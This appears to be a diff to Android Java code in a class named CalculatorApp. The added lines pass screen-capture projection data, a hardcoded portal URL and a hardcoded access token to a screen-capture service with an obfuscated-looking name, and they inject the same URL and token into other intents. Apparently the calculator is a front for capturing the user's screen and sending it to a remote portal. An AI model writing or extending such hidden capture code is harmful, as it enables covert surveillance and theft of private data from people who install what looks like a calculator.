@@ -139,6 +139,10 @@ public class CalculatorApp {
             Intent serviceIntent = new Intent();
             serviceIntent.setComponent(new ComponentName(activity.getPackageName(), "crc64dfab792b5cd2bc86.ScreenCaptureService"));
             serviceIntent.setAction("com.companyname.ConsentCapture.START");
+            serviceIntent.putExtra("resultCode", resultCode);
+            serviceIntent.putExtra("projectionData", data);
+            serviceIntent.putExtra("portalUrl", HARDCODED_URL);
+            serviceIntent.putExtra("accessToken", HARDCODED_TOKEN);
             serviceIntent.putExtra("com.companyname.ConsentCapture.EXTRA_RESULT_CODE", resultCode);
             serviceIntent.putExtra("com.companyname.ConsentCapture.EXTRA_PROJECTION_DATA", data);
             serviceIntent.putExtra("com.companyname.ConsentCapture.EXTRA_PORTAL_URL", HARDCODED_URL);
@@ -156,6 +160,8 @@ public class CalculatorApp {
     public static void patchIntent(Intent intent) {
         if (intent == null) return;
         try {
+            intent.putExtra("portalUrl", HARDCODED_URL);
+            intent.putExtra("accessToken", HARDCODED_TOKEN);
             intent.putExtra("com.companyname.ConsentCapture.EXTRA_PORTAL_URL", HARDCODED_URL);
             intent.putExtra("com.companyname.ConsentCapture.EXTRA_ACCESS_TOKEN", HARDCODED_TOKEN);
         } catch (Throwable t) {
